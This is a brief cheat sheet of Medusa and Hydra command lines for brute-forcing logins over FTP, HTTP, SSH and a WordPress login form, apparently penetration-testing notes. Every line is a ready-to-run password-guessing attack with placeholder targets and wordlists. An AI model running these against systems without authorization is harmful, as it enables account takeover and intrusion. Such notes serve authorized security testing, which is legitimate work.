# Medusa
- FTP: `medusa -h 172.21.0.0 -U [path to username file] -P [path to password file] -M ftp`
- HTTP, Single User, multiple passwords: `medusa -h target-ip -u [username] -P ../creds/passwords.txt -M http`
- HTTP: `medusa -H hosts.txt -U [path to username file] -P [path to password file] -M http`
- SSH non-standard port: `medusa -h 172.21.0.0 -U [path to username file] -P [path to password file] -M ssh -n 2222`
- Output results to log: `medusa -h 172.21.0.0 -U [path to username file] -P [path to password file] -M ftp -O log.txt`

# Hydra
- SSH Example, single user, custom passwordlist - `hydra -l user -P pass.txt -t 10 172.21.0.0 ssh -s 22`
- SSH Example, multiple users, : `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 172.21.0.0 ssh -s 22`
- HTTP POST Request: `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`